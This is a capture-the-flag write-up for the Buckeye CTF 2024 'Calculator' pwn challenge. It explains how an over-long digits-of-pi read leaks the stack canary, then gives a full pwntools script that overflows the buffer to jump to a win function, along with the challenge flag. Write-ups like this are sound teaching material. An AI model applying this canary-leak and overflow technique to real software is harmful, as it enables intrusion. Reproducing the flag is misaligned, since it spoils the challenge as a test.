# pwn / Calculator

A challenge from Buckeye CTF 2024

### Description

nc challs.pwnoh.io 13377

File: [calc](./calc)

### Solve

This was a fun challenge. Scrolling through the decomp, you can see that it does some math operation on two numbers, then lets you type whatever you want (there's a pretty big overflow), and then returns. However, stack canaries are enabled so you have to find a way to leak it first. The trick is when you print pi to use it for the operations. You can input an arbitrary number and then have it read that many digits of pi. If that number is past however many digits of pi that you have, it'll read extra data. The first time I printed, I used `50000` as the number of printed characters and it started printing environmental variables and then segfaulted.

So I had to find some offset after pi was stored where I could find the stack canary was stored. Learning about canaries, the same canary is reused in all functions in question. When I printed a lot of data, the canary appeared multiple times (I had to remember to search it little endian, and I found the canary through gdb). So I just needed to leak an extra like 16 characters to get the canary, then I could overflow to the win function.

Solve script:
```py
from pwn import *


# initialize the binary and set the context (architecture, etc.)
binary = "./calc" # ensure it is executable (chmod +x)
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

# run with python3 solve.py REMOTE
if args.REMOTE:
    p = remote("challs.pwnoh.io", 13377)

# run with python3 solve.py GDB
elif args.GDB:
    # having issues with gdb showing up? install and run `tmux` before running this script, then uncomment this:
    context.terminal = ["tmux", "splitw", "-h"]

    p = gdb.debug(binary, gdbscript=gs)

# run with python3 solve.py
else:
    p = elf.process()


### START HERE ###

# if a system call fails, it's a stack alignment issue
# just skip past the opening push statement in win to win
# when you call a lot of functions, the last nibble has to be set to 0
# many super optimized functions in system use weird vector stuff that assumes this and then you will get a segfault if it isn't
# you can either align it yourself or just skip past the first push statement in a given function
win = p64(0x004012fb)
# 0xdcc9376d2d195e00
print(p.recvuntil(b"operand: "))
print(p.sendline(b"pi"))
print(p.recvuntil(b"use: "))
p.sendline(str(0x2710 + 14).encode())
canary = p.recvline()[-9:-1]
print(canary)
print(p.recvuntil(b"operator: "))
p.sendline(b"*")
p.recvuntil(b"operand: ")
p.sendline(b"1")

print(p.recvuntil(b"here: "))
payload = b'A' * 40 + canary + b'B' * 8 + win
p.sendline(payload)

p.interactive()
```

Flag: `bctf{cAn4r13S_L0v3_t0_34t_P13_c760f8cc0a44fed9}`